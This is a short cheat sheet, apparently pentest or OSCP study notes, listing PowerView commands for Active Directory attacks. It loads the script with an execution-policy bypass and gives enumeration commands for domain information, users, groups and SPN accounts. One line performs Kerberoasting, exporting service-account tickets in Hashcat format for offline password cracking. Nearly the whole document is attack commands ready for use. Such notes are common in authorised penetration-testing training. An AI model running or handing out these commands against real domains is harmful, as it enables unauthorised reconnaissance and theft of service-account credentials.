# PowerView.ps1

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```powershell
powershell.exe -exec bypass; Import-Module PowerView.ps1
[OR] . .\PowerView.ps1
```

## Domain information

```bash
Get-NetDomain
Get-DomainSID
Get-DomainPolicy
Get-NetDomainController [-Domain DOMAIN]
# can use ping to figure out IP
```

## Domain Users

```powershell
Get-NetUser | select samaccountname,userprincipalname, memberof
Get-NetUser * -Domain DOMAIN | Select-Object -Property name,samaccountname,description,memberof,admincount,userprincipalname, serviceprincipalname, useraccountcontrol
```

### Kerberoastable Users

```powershell
Get-NetUser -SPN | select serviceprincipalname
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

## Domain Groups

```powershell
Get-NetGroup [-GroupName *admin*]
```

## References

* [https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands)
* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)